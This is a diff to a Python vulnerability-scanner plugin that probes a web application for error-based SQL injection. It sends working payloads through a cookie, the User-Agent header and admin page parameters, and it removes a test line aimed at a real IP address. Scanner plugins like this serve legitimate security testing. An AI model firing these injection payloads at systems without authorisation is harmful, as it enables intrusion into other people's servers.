@@ -23,12 +23,14 @@ def audit(arg):
     code, head, res, err, _ = curl.curl2(url, user_agent=useragent)
     if (code == 200) and (md5_1 in res):
         security_hole('SQL Injection: {url} UA:{useragent}'.format(url=url, useragent=useragent))
+        return arg
     #cookie注入
     cookie = 'reachstone_uid=1 and extractvalue(0x1,concat(0x23,md5(1)))'
     url = arg + 'include/authrp.php'
     code, head, res, err, _ = curl.curl2(url, cookie=cookie)
     if (code==200) and (md5_1 in res):
         security_hole('SQL Injection: {url} Cookie: {cookie}'.format(url=url,cookie=cookie))
+        return arg
     #GET 报错注入
     payloads = [
         arg + 'admin/config_MT.php?action=delete&Mid=1%20and%20extractvalue(0x1,concat(0x23,md5(1)))',
@@ -39,6 +41,7 @@ def audit(arg):
         code, head, res, err, _ = curl.curl2(payload)
         if (code == 200) and (md5_1 in res):
             security_hole('SQL Injection: ' + payload)
-if __name__ == '__main__':
+
+            return arg
+if __name__== '__main__':
     from dummy import *
-    audit(assign('ns-asg', 'https://121.28.81.124/')[1])
